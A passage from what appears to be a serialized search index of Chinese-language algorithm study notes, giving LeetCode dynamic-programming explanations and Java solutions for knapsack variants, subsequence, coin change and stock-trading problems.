public int findLongestChain(int[][] pairs) { if (pairs == null || pairs.length == 0) { return 0; } Arrays.sort(pairs, (a, b) -> (a[0] - b[0])); int n = pairs.length; int[] dp = new int[n]; Arrays.fill(dp, 1); for (int i = 1; i < n; i++) { for (int j = 0; j < i; j++) { if (pairs[j][1] < pairs[i][0]) { dp[i] = Math.max(dp[i], dp[j] + 1); } } } return Arrays.stream(dp).max().orElse(0);
}`},{header:"3. \u6700\u957F\u6446\u52A8\u5B50\u5E8F\u5217",slug:"_3-\u6700\u957F\u6446\u52A8\u5B50\u5E8F\u5217",content:`376. Wiggle Subsequence (Medium)
Leetcode / \u529B\u6263
Input: [1,7,4,9,2,5]
Output: 6
The entire sequence is a wiggle sequence. Input: [1,17,5,10,13,15,10,5,16,8]
Output: 7
There are several subsequences that achieve this length. One is [1,17,10,13,10,16,8]. Input: [1,2,3,4,5,6,7,8,9]
Output: 2
\u8981\u6C42\uFF1A\u4F7F\u7528 O(N) \u65F6\u95F4\u590D\u6742\u5EA6\u6C42\u89E3\u3002
public int wiggleMaxLength(int[] nums) { if (nums == null || nums.length == 0) { return 0; } int up = 1, down = 1; for (int i = 1; i < nums.length; i++) { if (nums[i] > nums[i - 1]) { up = down + 1; } else if (nums[i] < nums[i - 1]) { down = up + 1; } } return Math.max(up, down);
}`},{header:"\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217",slug:"\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217",content:`\u5BF9\u4E8E\u4E24\u4E2A\u5B50\u5E8F\u5217 S1 \u548C S2\uFF0C\u627E\u51FA\u5B83\u4EEC\u6700\u957F\u7684\u516C\u5171\u5B50\u5E8F\u5217\u3002
\u5B9A\u4E49\u4E00\u4E2A\u4E8C\u7EF4\u6570\u7EC4 dp \u7528\u6765\u5B58\u50A8\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\u7684\u957F\u5EA6\uFF0C\u5176\u4E2D dp[i][j] \u8868\u793A S1 \u7684\u524D i \u4E2A\u5B57\u7B26\u4E0E S2 \u7684\u524D j \u4E2A\u5B57\u7B26\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\u7684\u957F\u5EA6\u3002\u8003\u8651 S1i \u4E0E S2j \u503C\u662F\u5426\u76F8\u7B49\uFF0C\u5206\u4E3A\u4E24\u79CD\u60C5\u51B5\uFF1A \u5F53 S1i==S2j \u65F6\uFF0C\u90A3\u4E48\u5C31\u80FD\u5728 S1 \u7684\u524D i-1 \u4E2A\u5B57\u7B26\u4E0E S2 \u7684\u524D j-1 \u4E2A\u5B57\u7B26\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\u7684\u57FA\u7840\u4E0A\u518D\u52A0\u4E0A S1i \u8FD9\u4E2A\u503C\uFF0C\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\u957F\u5EA6\u52A0 1\uFF0C\u5373 dp[i][j] = dp[i-1][j-1] + 1\u3002
\u5F53 S1i != S2j \u65F6\uFF0C\u6B64\u65F6\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\u4E3A S1 \u7684\u524D i-1 \u4E2A\u5B57\u7B26\u548C S2 \u7684\u524D j \u4E2A\u5B57\u7B26\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\uFF0C\u6216\u8005 S1 \u7684\u524D i \u4E2A\u5B57\u7B26\u548C S2 \u7684\u524D j-1 \u4E2A\u5B57\u7B26\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\uFF0C\u53D6\u5B83\u4EEC\u7684\u6700\u5927\u8005\uFF0C\u5373 dp[i][j] = max{ dp[i-1][j], dp[i][j-1] }\u3002 \u7EFC\u4E0A\uFF0C\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\u7684\u72B6\u6001\u8F6C\u79FB\u65B9\u7A0B\u4E3A\uFF1A ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ecd89a22-c075-4716-8423-e0ba89230e9a.jpg" width="450px">
\u5BF9\u4E8E\u957F\u5EA6\u4E3A N \u7684\u5E8F\u5217 S1 \u548C\u957F\u5EA6\u4E3A M \u7684\u5E8F\u5217 S2\uFF0Cdp[N][M] \u5C31\u662F\u5E8F\u5217 S1 \u548C\u5E8F\u5217 S2 \u7684\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\u957F\u5EA6\u3002
\u4E0E\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217\u76F8\u6BD4\uFF0C\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\u6709\u4EE5\u4E0B\u4E0D\u540C\u70B9\uFF1A \u9488\u5BF9\u7684\u662F\u4E24\u4E2A\u5E8F\u5217\uFF0C\u6C42\u5B83\u4EEC\u7684\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\u3002
\u5728\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217\u4E2D\uFF0Cdp[i] \u8868\u793A\u4EE5 Si \u4E3A\u7ED3\u5C3E\u7684\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217\u957F\u5EA6\uFF0C\u5B50\u5E8F\u5217\u5FC5\u987B\u5305\u542B Si \uFF1B\u5728\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\u4E2D\uFF0Cdp[i][j] \u8868\u793A S1 \u4E2D\u524D i \u4E2A\u5B57\u7B26\u4E0E S2 \u4E2D\u524D j \u4E2A\u5B57\u7B26\u7684\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\u957F\u5EA6\uFF0C\u4E0D\u4E00\u5B9A\u5305\u542B S1i \u548C S2j\u3002
\u5728\u6C42\u6700\u7EC8\u89E3\u65F6\uFF0C\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\u4E2D dp[N][M] \u5C31\u662F\u6700\u7EC8\u89E3\uFF0C\u800C\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217\u4E2D dp[N] \u4E0D\u662F\u6700\u7EC8\u89E3\uFF0C\u56E0\u4E3A\u4EE5 SN \u4E3A\u7ED3\u5C3E\u7684\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217\u4E0D\u4E00\u5B9A\u662F\u6574\u4E2A\u5E8F\u5217\u6700\u957F\u9012\u589E\u5B50\u5E8F\u5217\uFF0C\u9700\u8981\u904D\u5386\u4E00\u904D dp \u6570\u7EC4\u627E\u5230\u6700\u5927\u8005\u3002`},{header:"1. \u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217",slug:"_1-\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217",content:`1143. Longest Common Subsequence
Leetcode / \u529B\u6263 public int longestCommonSubsequence(String text1, String text2) { int n1 = text1.length(), n2 = text2.length(); int[][] dp = new int[n1 + 1][n2 + 1]; for (int i = 1; i <= n1; i++) { for (int j = 1; j <= n2; j++) { if (text1.charAt(i - 1) == text2.charAt(j - 1)) { dp[i][j] = dp[i - 1][j - 1] + 1; } else { dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1]); } } } return dp[n1][n2]; }`},{header:"0-1 \u80CC\u5305",slug:"_0-1-\u80CC\u5305",content:`\u6709\u4E00\u4E2A\u5BB9\u91CF\u4E3A N \u7684\u80CC\u5305\uFF0C\u8981\u7528\u8FD9\u4E2A\u80CC\u5305\u88C5\u4E0B\u7269\u54C1\u7684\u4EF7\u503C\u6700\u5927\uFF0C\u8FD9\u4E9B\u7269\u54C1\u6709\u4E24\u4E2A\u5C5E\u6027\uFF1A\u4F53\u79EF w \u548C\u4EF7\u503C v\u3002
\u5B9A\u4E49\u4E00\u4E2A\u4E8C\u7EF4\u6570\u7EC4 dp \u5B58\u50A8\u6700\u5927\u4EF7\u503C\uFF0C\u5176\u4E2D dp[i][j] \u8868\u793A\u524D i \u4EF6\u7269\u54C1\u4F53\u79EF\u4E0D\u8D85\u8FC7 j \u7684\u60C5\u51B5\u4E0B\u80FD\u8FBE\u5230\u7684\u6700\u5927\u4EF7\u503C\u3002\u8BBE\u7B2C i \u4EF6\u7269\u54C1\u4F53\u79EF\u4E3A w\uFF0C\u4EF7\u503C\u4E3A v\uFF0C\u6839\u636E\u7B2C i \u4EF6\u7269\u54C1\u662F\u5426\u6DFB\u52A0\u5230\u80CC\u5305\u4E2D\uFF0C\u53EF\u4EE5\u5206\u4E24\u79CD\u60C5\u51B5\u8BA8\u8BBA\uFF1A \u7B2C i \u4EF6\u7269\u54C1\u6CA1\u6DFB\u52A0\u5230\u80CC\u5305\uFF0C\u603B\u4F53\u79EF\u4E0D\u8D85\u8FC7 j \u7684\u524D i \u4EF6\u7269\u54C1\u7684\u6700\u5927\u4EF7\u503C\u5C31\u662F\u603B\u4F53\u79EF\u4E0D\u8D85\u8FC7 j \u7684\u524D i-1 \u4EF6\u7269\u54C1\u7684\u6700\u5927\u4EF7\u503C\uFF0Cdp[i][j] = dp[i-1][j]\u3002
\u7B2C i \u4EF6\u7269\u54C1\u6DFB\u52A0\u5230\u80CC\u5305\u4E2D\uFF0Cdp[i][j] = dp[i-1][j-w] + v\u3002 \u7B2C i \u4EF6\u7269\u54C1\u53EF\u6DFB\u52A0\u4E5F\u53EF\u4EE5\u4E0D\u6DFB\u52A0\uFF0C\u53D6\u51B3\u4E8E\u54EA\u79CD\u60C5\u51B5\u4E0B\u6700\u5927\u4EF7\u503C\u66F4\u5927\u3002\u56E0\u6B64\uFF0C0-1 \u80CC\u5305\u7684\u72B6\u6001\u8F6C\u79FB\u65B9\u7A0B\u4E3A\uFF1A ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8cb2be66-3d47-41ba-b55b-319fc68940d4.png" width="400px">
// W \u4E3A\u80CC\u5305\u603B\u4F53\u79EF
// N \u4E3A\u7269\u54C1\u6570\u91CF
// weights \u6570\u7EC4\u5B58\u50A8 N \u4E2A\u7269\u54C1\u7684\u91CD\u91CF
// values \u6570\u7EC4\u5B58\u50A8 N \u4E2A\u7269\u54C1\u7684\u4EF7\u503C
public int knapsack(int W, int N, int[] weights, int[] values) { int[][] dp = new int[N + 1][W + 1]; for (int i = 1; i <= N; i++) { int w = weights[i - 1], v = values[i - 1]; for (int j = 1; j <= W; j++) { if (j >= w) { dp[i][j] = Math.max(dp[i - 1][j], dp[i - 1][j - w] + v); } else { dp[i][j] = dp[i - 1][j]; } } } return dp[N][W];
}
\u7A7A\u95F4\u4F18\u5316
\u5728\u7A0B\u5E8F\u5B9E\u73B0\u65F6\u53EF\u4EE5\u5BF9 0-1 \u80CC\u5305\u505A\u4F18\u5316\u3002\u89C2\u5BDF\u72B6\u6001\u8F6C\u79FB\u65B9\u7A0B\u53EF\u4EE5\u77E5\u9053\uFF0C\u524D i \u4EF6\u7269\u54C1\u7684\u72B6\u6001\u4EC5\u4E0E\u524D i-1 \u4EF6\u7269\u54C1\u7684\u72B6\u6001\u6709\u5173\uFF0C\u56E0\u6B64\u53EF\u4EE5\u5C06 dp \u5B9A\u4E49\u4E3A\u4E00\u7EF4\u6570\u7EC4\uFF0C\u5176\u4E2D dp[j] \u65E2\u53EF\u4EE5\u8868\u793A dp[i-1][j] \u4E5F\u53EF\u4EE5\u8868\u793A dp[i][j]\u3002\u6B64\u65F6\uFF0C ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9ae89f16-7905-4a6f-88a2-874b4cac91f4.jpg" width="300px">
\u56E0\u4E3A dp[j-w] \u8868\u793A dp[i-1][j-w]\uFF0C\u56E0\u6B64\u4E0D\u80FD\u5148\u6C42 dp[i][j-w]\uFF0C\u9632\u6B62\u5C06 dp[i-1][j-w] \u8986\u76D6\u3002\u4E5F\u5C31\u662F\u8BF4\u8981\u5148\u8BA1\u7B97 dp[i][j] \u518D\u8BA1\u7B97 dp[i][j-w]\uFF0C\u5728\u7A0B\u5E8F\u5B9E\u73B0\u65F6\u9700\u8981\u6309\u5012\u5E8F\u6765\u5FAA\u73AF\u6C42\u89E3\u3002
public int knapsack(int W, int N, int[] weights, int[] values) { int[] dp = new int[W + 1]; for (int i = 1; i <= N; i++) { int w = weights[i - 1], v = values[i - 1]; for (int j = W; j >= 1; j--) { if (j >= w) { dp[j] = Math.max(dp[j], dp[j - w] + v); } } } return dp[W];
}
\u65E0\u6CD5\u4F7F\u7528\u8D2A\u5FC3\u7B97\u6CD5\u7684\u89E3\u91CA
0-1 \u80CC\u5305\u95EE\u9898\u65E0\u6CD5\u4F7F\u7528\u8D2A\u5FC3\u7B97\u6CD5\u6765\u6C42\u89E3\uFF0C\u4E5F\u5C31\u662F\u8BF4\u4E0D\u80FD\u6309\u7167\u5148\u6DFB\u52A0\u6027\u4EF7\u6BD4\u6700\u9AD8\u7684\u7269\u54C1\u6765\u8FBE\u5230\u6700\u4F18\uFF0C\u8FD9\u662F\u56E0\u4E3A\u8FD9\u79CD\u65B9\u5F0F\u53EF\u80FD\u9020\u6210\u80CC\u5305\u7A7A\u95F4\u7684\u6D6A\u8D39\uFF0C\u4ECE\u800C\u65E0\u6CD5\u8FBE\u5230\u6700\u4F18\u3002\u8003\u8651\u4E0B\u9762\u7684\u7269\u54C1\u548C\u4E00\u4E2A\u5BB9\u91CF\u4E3A 5 \u7684\u80CC\u5305\uFF0C\u5982\u679C\u5148\u6DFB\u52A0\u7269\u54C1 0 \u518D\u6DFB\u52A0\u7269\u54C1 1\uFF0C\u90A3\u4E48\u53EA\u80FD\u5B58\u653E\u7684\u4EF7\u503C\u4E3A 16\uFF0C\u6D6A\u8D39\u4E86\u5927\u5C0F\u4E3A 2 \u7684\u7A7A\u95F4\u3002\u6700\u4F18\u7684\u65B9\u5F0F\u662F\u5B58\u653E\u7269\u54C1 1 \u548C\u7269\u54C1 2\uFF0C\u4EF7\u503C\u4E3A 22. id
w
v
v/w 0
1
6
6 1
2
10
5 2
3
12
4 \u53D8\u79CD \u5B8C\u5168\u80CC\u5305\uFF1A\u7269\u54C1\u6570\u91CF\u4E3A\u65E0\u9650\u4E2A \u591A\u91CD\u80CC\u5305\uFF1A\u7269\u54C1\u6570\u91CF\u6709\u9650\u5236 \u591A\u7EF4\u8D39\u7528\u80CC\u5305\uFF1A\u7269\u54C1\u4E0D\u4EC5\u6709\u91CD\u91CF\uFF0C\u8FD8\u6709\u4F53\u79EF\uFF0C\u540C\u65F6\u8003\u8651\u8FD9\u4E24\u79CD\u9650\u5236 \u5176\u5B83\uFF1A\u7269\u54C1\u4E4B\u95F4\u76F8\u4E92\u7EA6\u675F\u6216\u8005\u4F9D\u8D56`},{header:"1. \u5212\u5206\u6570\u7EC4\u4E3A\u548C\u76F8\u7B49\u7684\u4E24\u90E8\u5206",slug:"_1-\u5212\u5206\u6570\u7EC4\u4E3A\u548C\u76F8\u7B49\u7684\u4E24\u90E8\u5206",content:`416. Partition Equal Subset Sum (Medium)
Leetcode / \u529B\u6263
Input: [1, 5, 11, 5] Output: true Explanation: The array can be partitioned as [1, 5, 5] and [11].
\u53EF\u4EE5\u770B\u6210\u4E00\u4E2A\u80CC\u5305\u5927\u5C0F\u4E3A sum/2 \u7684 0-1 \u80CC\u5305\u95EE\u9898\u3002
public boolean canPartition(int[] nums) { int sum = computeArraySum(nums); if (sum % 2 != 0) { return false; } int W = sum / 2; boolean[] dp = new boolean[W + 1]; dp[0] = true; for (int num : nums) { // 0-1 \u80CC\u5305\u4E00\u4E2A\u7269\u54C1\u53EA\u80FD\u7528\u4E00\u6B21 for (int i = W; i >= num; i--) { // \u4ECE\u540E\u5F80\u524D\uFF0C\u5148\u8BA1\u7B97 dp[i] \u518D\u8BA1\u7B97 dp[i-num] dp[i] = dp[i] || dp[i - num]; } } return dp[W];
} private int computeArraySum(int[] nums) { int sum = 0; for (int num : nums) { sum += num; } return sum;
}`},{header:"2. \u6539\u53D8\u4E00\u7EC4\u6570\u7684\u6B63\u8D1F\u53F7\u4F7F\u5F97\u5B83\u4EEC\u7684\u548C\u4E3A\u4E00\u7ED9\u5B9A\u6570",slug:"_2-\u6539\u53D8\u4E00\u7EC4\u6570\u7684\u6B63\u8D1F\u53F7\u4F7F\u5F97\u5B83\u4EEC\u7684\u548C\u4E3A\u4E00\u7ED9\u5B9A\u6570",content:`494. Target Sum (Medium)
Leetcode / \u529B\u6263
Input: nums is [1, 1, 1, 1, 1], S is 3.
Output: 5
Explanation: -1+1+1+1+1 = 3
+1-1+1+1+1 = 3
+1+1-1+1+1 = 3
+1+1+1-1+1 = 3
+1+1+1+1-1 = 3 There are 5 ways to assign symbols to make the sum of nums be target 3.
\u8BE5\u95EE\u9898\u53EF\u4EE5\u8F6C\u6362\u4E3A Subset Sum \u95EE\u9898\uFF0C\u4ECE\u800C\u4F7F\u7528 0-1 \u80CC\u5305\u7684\u65B9\u6CD5\u6765\u6C42\u89E3\u3002
\u53EF\u4EE5\u5C06\u8FD9\u7EC4\u6570\u770B\u6210\u4E24\u90E8\u5206\uFF0CP \u548C N\uFF0C\u5176\u4E2D P \u4F7F\u7528\u6B63\u53F7\uFF0CN \u4F7F\u7528\u8D1F\u53F7\uFF0C\u6709\u4EE5\u4E0B\u63A8\u5BFC\uFF1A sum(P) - sum(N) = target
sum(P) + sum(N) + sum(P) - sum(N) = target + sum(P) + sum(N) 2 * sum(P) = target + sum(nums)
\u56E0\u6B64\u53EA\u8981\u627E\u5230\u4E00\u4E2A\u5B50\u96C6\uFF0C\u4EE4\u5B83\u4EEC\u90FD\u53D6\u6B63\u53F7\uFF0C\u5E76\u4E14\u548C\u7B49\u4E8E (target + sum(nums))/2\uFF0C\u5C31\u8BC1\u660E\u5B58\u5728\u89E3\u3002
public int findTargetSumWays(int[] nums, int S) { int sum = computeArraySum(nums); if (sum < S || (sum + S) % 2 == 1) { return 0; } int W = (sum + S) / 2; int[] dp = new int[W + 1]; dp[0] = 1; for (int num : nums) { for (int i = W; i >= num; i--) { dp[i] = dp[i] + dp[i - num]; } } return dp[W];
} private int computeArraySum(int[] nums) { int sum = 0; for (int num : nums) { sum += num; } return sum;
}
DFS \u89E3\u6CD5\uFF1A
public int findTargetSumWays(int[] nums, int S) { return findTargetSumWays(nums, 0, S);
} private int findTargetSumWays(int[] nums, int start, int S) { if (start == nums.length) { return S == 0 ? 1 : 0; } return findTargetSumWays(nums, start + 1, S + nums[start]) + findTargetSumWays(nums, start + 1, S - nums[start]);
}`},{header:"3. 01 \u5B57\u7B26\u6784\u6210\u6700\u591A\u7684\u5B57\u7B26\u4E32",slug:"_3-01-\u5B57\u7B26\u6784\u6210\u6700\u591A\u7684\u5B57\u7B26\u4E32",content:`474. Ones and Zeroes (Medium)
Leetcode / \u529B\u6263
Input: Array = {"10", "0001", "111001", "1", "0"}, m = 5, n = 3
Output: 4 Explanation: There are totally 4 strings can be formed by the using of 5 0s and 3 1s, which are "10","0001","1","0"
\u8FD9\u662F\u4E00\u4E2A\u591A\u7EF4\u8D39\u7528\u7684 0-1 \u80CC\u5305\u95EE\u9898\uFF0C\u6709\u4E24\u4E2A\u80CC\u5305\u5927\u5C0F\uFF0C0 \u7684\u6570\u91CF\u548C 1 \u7684\u6570\u91CF\u3002
public int findMaxForm(String[] strs, int m, int n) { if (strs == null || strs.length == 0) { return 0; } int[][] dp = new int[m + 1][n + 1]; for (String s : strs) { // \u6BCF\u4E2A\u5B57\u7B26\u4E32\u53EA\u80FD\u7528\u4E00\u6B21 int ones = 0, zeros = 0; for (char c : s.toCharArray()) { if (c == '0') { zeros++; } else { ones++; } } for (int i = m; i >= zeros; i--) { for (int j = n; j >= ones; j--) { dp[i][j] = Math.max(dp[i][j], dp[i - zeros][j - ones] + 1); } } } return dp[m][n];
}`},{header:"4. \u627E\u96F6\u94B1\u7684\u6700\u5C11\u786C\u5E01\u6570",slug:"_4-\u627E\u96F6\u94B1\u7684\u6700\u5C11\u786C\u5E01\u6570",content:`322. Coin Change (Medium)
Leetcode / \u529B\u6263
Example 1:
coins = [1, 2, 5], amount = 11
return 3 (11 = 5 + 5 + 1) Example 2:
coins = [2], amount = 3
return -1.
\u9898\u76EE\u63CF\u8FF0\uFF1A\u7ED9\u4E00\u4E9B\u9762\u989D\u7684\u786C\u5E01\uFF0C\u8981\u6C42\u7528\u8FD9\u4E9B\u786C\u5E01\u6765\u7EC4\u6210\u7ED9\u5B9A\u9762\u989D\u7684\u94B1\u6570\uFF0C\u5E76\u4E14\u4F7F\u5F97\u786C\u5E01\u6570\u91CF\u6700\u5C11\u3002\u786C\u5E01\u53EF\u4EE5\u91CD\u590D\u4F7F\u7528\u3002 \u7269\u54C1\uFF1A\u786C\u5E01
\u7269\u54C1\u5927\u5C0F\uFF1A\u9762\u989D
\u7269\u54C1\u4EF7\u503C\uFF1A\u6570\u91CF \u56E0\u4E3A\u786C\u5E01\u53EF\u4EE5\u91CD\u590D\u4F7F\u7528\uFF0C\u56E0\u6B64\u8FD9\u662F\u4E00\u4E2A\u5B8C\u5168\u80CC\u5305\u95EE\u9898\u3002\u5B8C\u5168\u80CC\u5305\u53EA\u9700\u8981\u5C06 0-1 \u80CC\u5305\u7684\u9006\u5E8F\u904D\u5386 dp \u6570\u7EC4\u6539\u4E3A\u6B63\u5E8F\u904D\u5386\u5373\u53EF\u3002
public int coinChange(int[] coins, int amount) { if (amount == 0 || coins == null) return 0; int[] dp = new int[amount + 1]; for (int coin : coins) { for (int i = coin; i <= amount; i++) { //\u5C06\u9006\u5E8F\u904D\u5386\u6539\u4E3A\u6B63\u5E8F\u904D\u5386 if (i == coin) { dp[i] = 1; } else if (dp[i] == 0 && dp[i - coin] != 0) { dp[i] = dp[i - coin] + 1; } else if (dp[i - coin] != 0) { dp[i] = Math.min(dp[i], dp[i - coin] + 1); } } } return dp[amount] == 0 ? -1 : dp[amount];
}`},{header:"5. \u627E\u96F6\u94B1\u7684\u786C\u5E01\u6570\u7EC4\u5408",slug:"_5-\u627E\u96F6\u94B1\u7684\u786C\u5E01\u6570\u7EC4\u5408",content:`518. Coin Change 2 (Medium)
Leetcode / \u529B\u6263
Input: amount = 5, coins = [1, 2, 5]
Output: 4
Explanation: there are four ways to make up the amount:
5=5
5=2+2+1
5=2+1+1+1
5=1+1+1+1+1
\u5B8C\u5168\u80CC\u5305\u95EE\u9898\uFF0C\u4F7F\u7528 dp \u8BB0\u5F55\u53EF\u8FBE\u6210\u76EE\u6807\u7684\u7EC4\u5408\u6570\u76EE\u3002
public int change(int amount, int[] coins) { if (coins == null) { return 0; } int[] dp = new int[amount + 1]; dp[0] = 1; for (int coin : coins) { for (int i = coin; i <= amount; i++) { dp[i] += dp[i - coin]; } } return dp[amount];
}`},{header:"6. \u5B57\u7B26\u4E32\u6309\u5355\u8BCD\u5217\u8868\u5206\u5272",slug:"_6-\u5B57\u7B26\u4E32\u6309\u5355\u8BCD\u5217\u8868\u5206\u5272",content:`139. Word Break (Medium)
Leetcode / \u529B\u6263
s = "leetcode",
dict = ["leet", "code"].
Return true because "leetcode" can be segmented as "leet code".
dict \u4E2D\u7684\u5355\u8BCD\u6CA1\u6709\u4F7F\u7528\u6B21\u6570\u7684\u9650\u5236\uFF0C\u56E0\u6B64\u8FD9\u662F\u4E00\u4E2A\u5B8C\u5168\u80CC\u5305\u95EE\u9898\u3002
\u8BE5\u95EE\u9898\u6D89\u53CA\u5230\u5B57\u5178\u4E2D\u5355\u8BCD\u7684\u4F7F\u7528\u987A\u5E8F\uFF0C\u4E5F\u5C31\u662F\u8BF4\u7269\u54C1\u5FC5\u987B\u6309\u4E00\u5B9A\u987A\u5E8F\u653E\u5165\u80CC\u5305\u4E2D\uFF0C\u4F8B\u5982\u4E0B\u9762\u7684 dict \u5C31\u4E0D\u591F\u7EC4\u6210\u5B57\u7B26\u4E32 "leetcode"\uFF1A
["lee", "tc", "cod"]
\u6C42\u89E3\u987A\u5E8F\u7684\u5B8C\u5168\u80CC\u5305\u95EE\u9898\u65F6\uFF0C\u5BF9\u7269\u54C1\u7684\u8FED\u4EE3\u5E94\u8BE5\u653E\u5728\u6700\u91CC\u5C42\uFF0C\u5BF9\u80CC\u5305\u7684\u8FED\u4EE3\u653E\u5728\u5916\u5C42\uFF0C\u53EA\u6709\u8FD9\u6837\u624D\u80FD\u8BA9\u7269\u54C1\u6309\u4E00\u5B9A\u987A\u5E8F\u653E\u5165\u80CC\u5305\u4E2D\u3002
public boolean wordBreak(String s, List<String> wordDict) { int n = s.length(); boolean[] dp = new boolean[n + 1]; dp[0] = true; for (int i = 1; i <= n; i++) { for (String word : wordDict) { // \u5BF9\u7269\u54C1\u7684\u8FED\u4EE3\u5E94\u8BE5\u653E\u5728\u6700\u91CC\u5C42 int len = word.length(); if (len <= i && word.equals(s.substring(i - len, i))) { dp[i] = dp[i] || dp[i - len]; } } } return dp[n];
}`},{header:"7. \u7EC4\u5408\u603B\u548C",slug:"_7-\u7EC4\u5408\u603B\u548C",content:`377. Combination Sum IV (Medium)
Leetcode / \u529B\u6263
nums = [1, 2, 3]
target = 4 The possible combination ways are:
(1, 1, 1, 1)
(1, 1, 2)
(1, 2, 1)
(1, 3)
(2, 1, 1)
(2, 2)
(3, 1) Note that different sequences are counted as different combinations. Therefore the output is 7.
\u6D89\u53CA\u987A\u5E8F\u7684\u5B8C\u5168\u80CC\u5305\u3002
public int combinationSum4(int[] nums, int target) { if (nums == null || nums.length == 0) { return 0; } int[] maximum = new int[target + 1]; maximum[0] = 1; Arrays.sort(nums); for (int i = 1; i <= target; i++) { for (int j = 0; j < nums.length && nums[j] <= i; j++) { maximum[i] += maximum[i - nums[j]]; } } return maximum[target];
}`},{header:"\u80A1\u7968\u4EA4\u6613",slug:"\u80A1\u7968\u4EA4\u6613",content:""},{header:"1. \u9700\u8981\u51B7\u5374\u671F\u7684\u80A1\u7968\u4EA4\u6613",slug:"_1-\u9700\u8981\u51B7\u5374\u671F\u7684\u80A1\u7968\u4EA4\u6613",content:`309. Best Time to Buy and Sell Stock with Cooldown(Medium)
Leetcode / \u529B\u6263
\u9898\u76EE\u63CF\u8FF0\uFF1A\u4EA4\u6613\u4E4B\u540E\u9700\u8981\u6709\u4E00\u5929\u7684\u51B7\u5374\u65F6\u95F4\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ffd96b99-8009-487c-8e98-11c9d44ef14f.png" width="300px">
public int maxProfit(int[] prices) { if (prices == null || prices.length == 0) { return 0; } int N = prices.length; int[] buy = new int[N]; int[] s1 = new int[N]; int[] sell = new int[N]; int[] s2 = new int[N]; s1[0] = buy[0] = -prices[0]; sell[0] = s2[0] = 0; for (int i = 1; i < N; i++) { buy[i] = s2[i - 1] - prices[i]; s1[i] = Math.max(buy[i - 1], s1[i - 1]); sell[i] = Math.max(buy[i - 1], s1[i - 1]) + prices[i]; s2[i] = Math.max(s2[i - 1], sell[i - 1]); } return Math.max(sell[N - 1], s2[N - 1]);
}`},{header:"2. \u9700\u8981\u4EA4\u6613\u8D39\u7528\u7684\u80A1\u7968\u4EA4\u6613",slug:"_2-\u9700\u8981\u4EA4\u6613\u8D39\u7528\u7684\u80A1\u7968\u4EA4\u6613",content:`714. Best Time to Buy and Sell Stock with Transaction Fee (Medium)
Leetcode / \u529B\u6263
Input: prices = [1, 3, 2, 8, 4, 9], fee = 2
Output: 8
Explanation: The maximum profit can be achieved by:
Buying at prices[0] = 1
Selling at prices[3] = 8
Buying at prices[4] = 4
Selling at prices[5] = 9
The total profit is ((8 - 1) - 2) + ((9 - 4) - 2) = 8.
\u9898\u76EE\u63CF\u8FF0\uFF1A\u6BCF\u4EA4\u6613\u4E00\u6B21\uFF0C\u90FD\u8981\u652F\u4ED8\u4E00\u5B9A\u7684\u8D39\u7528\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1e2c588c-72b7-445e-aacb-d55dc8a88c29.png" width="300px">
public int maxProfit(int[] prices, int fee) { int N = prices.length; int[] buy = new int[N]; int[] s1 = new int[N]; int[] sell = new int[N]; int[] s2 = new int[N]; s1[0] = buy[0] = -prices[0]; sell[0] = s2[0] = 0; for (int i = 1; i < N; i++) { buy[i] = Math.max(sell[i - 1], s2[i - 1]) - prices[i]; s1[i] = Math.max(buy[i - 1], s1[i - 1]); sell[i] = Math.max(buy[i - 1], s1[i - 1]) - fee + prices[i]; s2[i] = Math.max(s2[i - 1], sell[i - 1]); } return Math.max(sell[N - 1], s2[N - 1]);
}`},{header:"3. \u53EA\u80FD\u8FDB\u884C\u4E24\u6B21\u7684\u80A1\u7968\u4EA4\u6613",slug:"_3-\u53EA\u80FD\u8FDB\u884C\u4E24\u6B21\u7684\u80A1\u7968\u4EA4\u6613",content:`123. Best Time to Buy and Sell Stock III (Hard)
Leetcode / \u529B\u6263
public int maxProfit(int[] prices) { int firstBuy = Integer.MIN_VALUE, firstSell = 0; int secondBuy = Integer.MIN_VALUE, secondSell = 0; for (int curPrice : prices) { if (firstBuy < -curPrice) { firstBuy = -curPrice; } if (firstSell < firstBuy + curPrice) { firstSell = firstBuy + curPrice; } if (secondBuy < firstSell - curPrice) { secondBuy = firstSell - curPrice; } if (secondSell < secondBuy + curPrice) { secondSell = secondBuy + curPrice; } } return secondSell;
}`},{header:"4. \u53EA\u80FD\u8FDB\u884C k \u6B21\u7684\u80A1\u7968\u4EA4\u6613",slug:"_4-\u53EA\u80FD\u8FDB\u884C-k-\u6B21\u7684\u80A1\u7968\u4EA4\u6613",content:`188. Best Time to Buy and Sell Stock IV (Hard)
Leetcode / \u529B\u6263
